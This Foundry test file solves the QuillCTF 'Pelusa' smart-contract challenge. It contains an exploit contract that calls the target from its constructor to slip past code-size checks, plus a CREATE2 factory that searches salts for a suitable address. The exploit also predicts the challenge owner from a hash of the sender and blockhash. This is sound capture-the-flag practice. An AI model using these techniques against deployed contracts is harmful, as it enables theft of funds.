// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/Pelusa.sol";

contract PelusaTest is Test {
    Pelusa public pelusa;
    Exploit public exploit;
    address public deployer;
    address public attacker;
    address public deployedExploit;
    address public owner;
    Factory factory;

    function setUp() public {
        deployer = vm.addr(1); 
        attacker = vm.addr(2);
        console.log(attacker);

        vm.startPrank(deployer);
        pelusa = new Pelusa();
        factory = new Factory();
        vm.stopPrank();
        
        vm.startPrank(attacker, attacker);
        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
        console.log(owner);
        bytes32 _salt = findSaltForCondition(address(pelusa), owner);
        console.log(uint256(_salt));
        deployedExploit = factory.deploy(_salt, address(pelusa), owner);
        vm.stopPrank();
    }

    function findSaltForCondition(address _constructorArg, address _owner) public view returns (bytes32) {
        bytes32 salt;
        for (uint256 i = 0; i < 100000; i++) {
            salt = bytes32(i);
            address predictedAddress = factory.predictAddress(address(factory), salt, _constructorArg,_owner);
            uint256 addressAsUint = uint256(uint160(predictedAddress));
            if (addressAsUint % 100 == 10) {
                return salt;
            }
        }
        revert("No suitable salt found");
    }

    function testPelusaExploit() public {
        // Exploit
        vm.startPrank(attacker);
        deployedExploit.call(abi.encodeWithSignature("attack()", ""));
        vm.stopPrank();
    }
}

contract Exploit {
    address public pelusa;
    address public owner;
    uint256 public value = 22_06_1986;

    constructor(address _pelusa, address _owner) {
        pelusa = _pelusa;
        owner = _owner;
        Pelusa(pelusa).passTheBall();
    }

    function getBallPossesion() external view returns (address) {
        return owner;
    }

    function attack() external {
        Pelusa(pelusa).shoot();        
    }

    function handOfGod() public view returns (bytes32) {
        return bytes32(abi.encodePacked(value));
    }
}
 


contract Factory {
    // Use `CREATE2` to deploy contract
    function deploy(bytes32 salt, address constructorArg, address owner) public returns (address) {
        address deployedAddress;
        bytes memory bytecode = abi.encodePacked(
            type(Exploit).creationCode,
            abi.encode(constructorArg, owner)
        );
        assembly {
            deployedAddress := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        return deployedAddress;
    }
    
    // Predict `CREATE2` deployed address
    function predictAddress(address deployer, bytes32 salt, address constructorArg, address owner) public pure returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(Exploit).creationCode,
            abi.encode(constructorArg, owner)
        );
        bytes32 _hash = keccak256(abi.encodePacked(
            hex"ff",
            deployer,
            salt,
            keccak256(bytecode)
        ));
        return address(uint160(uint256(_hash)));
    }
}